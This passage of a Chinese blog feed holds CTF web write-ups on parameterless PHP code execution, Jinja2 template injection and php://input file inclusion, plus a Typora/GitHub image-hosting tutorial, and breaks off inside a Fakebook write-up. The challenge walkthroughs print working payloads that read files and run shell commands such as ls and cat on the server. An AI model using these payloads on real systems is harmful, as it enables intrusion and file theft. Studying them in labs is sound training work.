</span><br></pre></td></tr></table></figure><p><code>var_dump</code>可以把返回数组打印出来。</p><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><p>获取环境变量的值(在PHP7.1之后可以不给予参数)<br>适用于：php7以上的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(getenv());</span><br></pre></td></tr></table></figure><p>php7.0以下返回<code>bool(false)</code> </p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302244409.png" alt="image-20220930224436363"></p><p>php7.0以上正常回显。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(getenv(phpinfo()));</span><br></pre></td></tr></table></figure><p>phpinfo()可以获取所有环境变量。</p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>文件读取</p><h4 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><h4 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前目录倒数第一位文件：</span><br><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">当前目录倒数第二位文件：</span><br><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">随机返回当前目录文件：</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h4 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure><h4 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure><p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p><h4 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h4><p>所获得的字符串第一位有几率是/，需要多试几次</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><p>官方解释：<code>localeconv()</code> 函数返回一个包含本地数字及货币格式信息的数组。</p><h3 id="current-和pos"><a href="#current-和pos" class="headerlink" title="current()和pos()"></a>current()和pos()</h3><p><code>pos()</code>函数是<code>current()</code>函数的别名，两者是完全一样的，</p><p>它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值。</p><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p><h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="三、实战例题-GXYCTF2019-禁止套娃"><a href="#三、实战例题-GXYCTF2019-禁止套娃" class="headerlink" title="三、实战例题-[GXYCTF2019]禁止套娃"></a>三、实战例题-[GXYCTF2019]禁止套娃</h2><p>这道题目打开就是一个普通的页面，经过目录扫描会发现是git源码泄露，用<code>Githack</code>把源码弄出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><strong>首先看第一行关键代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure><p>很明显，大概意思就是不让我们用伪协议去写或者是读文件。</p><p><strong>然后看第二行关键代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure><p>再看第二个正则,中间有一个(?R)，这个式子他会递归调用当前的正则表达式，就是说会出现\w+((?R)?)，\w+(\w+((?R)?))的情况，也就是无参数函数校验。</p><p><strong>最后第三行关键代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure><p>就是屏蔽了一些函数名的关键字之类的东西。</p><p><strong>分析完成我们整理一下：不能用伪协议 、只能用无参数函数形式、注意函数过滤</strong></p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="首先遍历当前目录："><a href="#首先遍历当前目录：" class="headerlink" title="首先遍历当前目录："></a>首先遍历当前目录：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302244510.png" alt="image-20220930224447474"></p><p>顺利得到目录。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>可以看到<code>flag.php</code>是倒数第二个，那我们把它反转一下，然后再用一个<code>next()</code>就是<code>flag.php</code>这个文件了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302244195.png" alt="image-20220930224455165"></p><p>已经很接近答案了，用<code>highlight_file</code>读取这个文件就拿到flag了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302245504.png" alt="image-20220930224501472"></p><p><strong>思路总结</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>我们已经知道了flag就在当前目录下了。<br><code>array_rand()</code>函数可以随机读取一个数组键，<code>array_flip()</code>又可以将数组中的键和值进行对换。<br>用这两个函数就可以实现对flag.php的读取。最后payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302245013.png" alt="image-20220930224509983"></p><p>因为<code>array_rand()</code>的选取是随机的，所以不一定会直接出来，多刷新几次就可以了</p><h2 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a>四、参考文章</h2><p><a href="https://xz.aliyun.com/t/10780#toc-1">无参数命令执行学习</a></p><p><a href="http://arsenetang.com/2021/07/26/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%8F%82%E6%95%B0rce/#%E4%BE%8B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94%E2%80%93GXYCTF-2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">RCE篇之无参数rce</a></p><p><a href="https://www.freebuf.com/articles/system/242482.html">无参数读文件和RCE总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI例题</title>
      <link href="/posts/SSTI%E4%BE%8B%E9%A2%98/"/>
      <url>/posts/SSTI%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SSTI例题"><a href="#SSTI例题" class="headerlink" title="SSTI例题"></a><strong>SSTI例题</strong></h1><p><strong>初学SSTI，知识很有限。</strong></p><h2 id="Simple-SSTI-2-Bugku"><a href="#Simple-SSTI-2-Bugku" class="headerlink" title="Simple_SSTI_2 (Bugku)"></a><strong>Simple_SSTI_2 (Bugku)</strong></h2><p><strong>进入链接</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302245843.png" alt="image-20220930224539802">**</p><p><strong>提示需要传入一个名为flag的参数，根据经验，一般在config里有东西，所以尝试</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302245397.png" alt="image-20220930224547347">**</p><p><strong>存在返回结果，但是config里没有发现什么东西。</strong></p><p><strong>已知是SSTI漏洞，那么接着利用漏洞ls查看一下</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##__class__：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</span><br><span class="line">##__init__：初始化类，返回的类型是function</span><br><span class="line">##__globals__[]：使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">##os.popen() 方法用于从一个命令打开一个管道。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302245597.png" alt="image-20220930224559558">**</p><p><strong>发现很多文件目录，一个一个查看，在第一个文件目录里就发现了flag文件</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302246103.png" alt="image-20220930224606066">**</p><p><strong>这里没有设置过滤，所以直接<code>cat ../app/flag</code>得到flag</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302246950.png" alt="image-20220930224613919">**</p><h2 id="G1CTF2021-SSTI"><a href="#G1CTF2021-SSTI" class="headerlink" title="[G1CTF2021]SSTI"></a><strong>[G1CTF2021]SSTI</strong></h2><p><strong>打开链接，点击图中图标都没有反应</strong><br><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302246779.png" alt="image-20220930224628726"><br><strong>依照下表进行语句测试</strong><br><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302246483.png" alt="image-20220930224638423">**<br><strong>当执行?cmd=49时出现回显</strong><br><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302246891.png" alt="image-20220930224648802">**<br><strong>搜索可以得到</strong><br><strong>Jinjia2模板引擎通用的RCE Payload：(或者上面那一道题的payload也可以)</strong></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>执行成功</strong><br><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302247766.png" alt="image-20220930224705718"><br><strong>然后将payload里的’ls’改为’cat /flag’</strong><br><strong>在cat flag时发现存在过滤，测试可以发现过滤了flag</strong><br><strong>所以将’cat /flag’改成’cat /f*lag’绕过</strong><br><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209302247405.png" alt="image-20220930224719354"><br><strong>得到flag，提交正确。</strong></p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><strong><a href="https://blog.csdn.net/weixin_54515836/article/details/113778233">ssti详解与例题以及绕过payload大全</a></strong></p><p><strong><a href="https://saucer-man.com/information_security/516.html#cl-6">ctf中的python ssti</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora+github实现图床功能</title>
      <link href="/posts/Typra+Github%E5%AE%9E%E7%8E%B0%E5%9B%BE%E5%BA%8A%E5%8A%9F%E8%83%BD/"/>
      <url>/posts/Typra+Github%E5%AE%9E%E7%8E%B0%E5%9B%BE%E5%BA%8A%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>在日常学习中常用Typora写博客，但是将Typora写的内容上传博客时会发现博客里的图片无法显示，只会显示一个本地地址，将图片一张一张存文件夹再用地址引用实在太麻烦了，所以这里就需要用到图床，这篇文章主要介绍利用github实现图床功能。</strong></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><strong>Typora软件：</strong><a href="https://www.typora.io/#windows">https://www.typora.io/#windows</a> <strong>(一款轻便简洁的Markdown编辑器，现在新版的要收费，可自行查找免费版)</strong></p><p><strong>nodejs</strong>：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a> <strong>(搭建过个人博客的话电脑上基本都有这个插件)</strong></p><p><strong>Github账号</strong>：<a href="https://github.com/">https://github.com/</a> <strong>(有时候登录会很慢，请耐心尝试，一直不行建议换浏览器、换电脑……)</strong></p><h2 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h2><p><strong>现在的Typora里都可以下载PicGo，在Typora左上角的文件里进入偏好设置</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291952553.png" alt="image-20220305180055596"></p><h2 id="Github建立图床仓库"><a href="#Github建立图床仓库" class="headerlink" title="Github建立图床仓库"></a>Github建立图床仓库</h2><p><strong>Github注册过程省略，如若不会自行百度，此处跳过。</strong></p><p><strong>①注册Github账号后点击创建仓库</strong>。</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291953247.png" alt="image-20220401183524863"></p><p><strong>②获取私人令牌</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291956535.png" alt="image-20220401184258459"></p><p><strong>令牌配置：令牌命名&gt;勾选repo&gt;点击创建</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291957469.png" alt="image-20220929195756412"></p><p><strong>创建完成后复制token，至此github配置完成。</strong></p><p><strong>注：私人令牌只会出现一次，复制完备份存一下，不然丢了只能重新创建。</strong></p><h2 id="PicGo里配置Gitee的设置"><a href="#PicGo里配置Gitee的设置" class="headerlink" title="PicGo里配置Gitee的设置"></a>PicGo里配置Gitee的设置</h2><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291958948.png" alt="image-20220929195806891"></p><p><strong>①repo:即[github用户名]+[仓库名] （仓库名即第一步新建仓库时设置的名称）</strong></p><p><strong>②branch: 如果仓库分支是master这里就填master，保证和仓库的分支一致，我这里是main，可自行修改分支</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291958352.png" alt="image-20220929195819292"></p><p><strong>③token:前面复制的私人令牌</strong></p><p><strong>④设定自定义域名：<a href="https://cdn.jsdelivr.net/gh/[github%E7%94%A8%E6%88%B7%E5%90%8D]/[%E4%BB%93%E5%BA%93%E5%90%8D]@main%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BB%93%E5%BA%93%E5%88%86%E6%94%AF%E4%B8%BAmain%E9%82%A3%E4%B9%88%E6%AD%A4%E5%A4%84%E7%9A%84%E5%88%86%E6%94%AF%E4%B9%9F%E4%B8%80%E5%AE%9A%E8%A6%81%E5%A1%AB%E5%86%99@main%EF%BC%8C%E5%90%A6%E5%88%99%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8master%E5%88%86%E6%94%AF%E3%80%82">https://cdn.jsdelivr.net/gh/[github用户名]/[仓库名]@main，如果仓库分支为main那么此处的分支也一定要填写@main，否则默认使用master分支。</a></strong></p><h2 id="测试上传功能"><a href="#测试上传功能" class="headerlink" title="测试上传功能"></a>测试上传功能</h2><p><strong>①在PicGo上传区选一张图片上传，成功后可以在相册里查看</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291958752.png" alt="image-20220929195828706"></p><p><strong>②Typora图像设置</strong></p><p><strong>文件 &gt; 偏好设置</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291958865.png" alt="image-20220929195835817"></p><p><strong>③最后新建一篇文章随意放上一张图片再上传博客查看测试结果</strong></p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202209291958881.png" alt="image-20220929195848576"></p><p><strong>到这里，图床就搭建成功了。</strong></p><h2 id="最后吐槽"><a href="#最后吐槽" class="headerlink" title="最后吐槽"></a>最后吐槽</h2><p>本来这是一篇关于搭建gitee图床的文章，但是因为前几天gitee设置了防盗链导致图床全部失效，无奈改成github图床，之前一直以为github当图床加载图片会比较慢，但用了之后才发现，有cdn加速的github，是真的快。</p>]]></content>
      
      
      <categories>
          
          <category> Blog功能 </category>
          
          <category> 搭建图床 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_include(攻防世界)</title>
      <link href="/posts/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/"/>
      <url>/posts/Web_php_include(%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开链接是一串php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);  <span class="comment">//语法高亮，基本没利用点</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];    <span class="comment">//输出传参hello，因该是给我们用来判定是否传入数据成功</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];   <span class="comment">//将get到的page值赋给$page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123; <span class="comment">//当我传入PHp://时函数是没有检测到，返回false那么循环语句里面的都不执行。</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>); <span class="comment">//执行包含$page文件，而page的内容我们可以通过post方式传入。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对上面的代码进行分析+看别的题解大概知道就是我们先get传入</p><blockquote><p>?page=php://input（利用php伪协议大小写绕过改成?page=PHP://input）</p></blockquote><p>然后就能以post方式传入我们想要执行的命令<br>传入post值：</p><blockquote><?php system("ls");?><p>得到<br><img src="https://img-blog.csdnimg.cn/a1b701842cb34edda756363651c7d132.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>flag应该就在fl4gisisish3r3.php里面<br>接着我们将post值改成<br><?php system("cat fl4gisisish3r3.php");?><br>在源代码中可以找到flag<br><img src="https://img-blog.csdnimg.cn/25175a0d7a2c44d1b9d7d1a03c4d4349.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LW25LiN5LiK5pep6aWt,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><p><strong>文件包含漏洞</strong><br>文件包含漏洞，就是说你使用文件包含函数后，会把你包含的文件也进行一遍编译或者叫做执行。    PHP中文件包含函数有以下四种：</p><blockquote><p>require()、require_once()、include()、include_once()</p></blockquote><p>其中include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；<br>require函数出现错误的时候，会直接报错并退出程序的执行。<br>include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次.<br><strong>php伪协议中的php://input</strong><br>一般的利用形式为file=php://input。php://input    可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行且php://input 也可以用来生成一句话木马。<br><strong>strstr函数的理解</strong><br>strstr(被搜索的字符串，搜索的字符串)  函数搜索字符串在另一字符串中是否存在，如果是返回该字符串及剩余部分，否则返回    FALSE。但是需要注意它是严格区分大小写的，也就是说可以利用PHp://input。 str_replace函数的理解      str_replace(str1,str2,str),将str字符串中的str1替换成str2注意：他是区分大小写的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/posts/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/posts/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%EF%BC%88%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>人除我佬。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入网站，界面如下<br><img src="https://img-blog.csdnimg.cn/2021051720552260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先打开<strong>join</strong>看一下，注册页面，随便注册一下<br>注册成功后直接登录<br><img src="https://img-blog.csdnimg.cn/20210517205837581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>username</strong>下面可以点击进入<br><img src="https://img-blog.csdnimg.cn/20210517205934984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就不会写了，按惯例看大佬的题解：<br>通过dirsearch爆破出网站存在一个**/flag.php**网页，但是无法正常读取。<br>访问robots协议，发现有源码备份文件。<br><img src="https://img-blog.csdnimg.cn/2021051721145011.png" alt="在这里插入图片描述"><br>访问，下载，得到源码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span 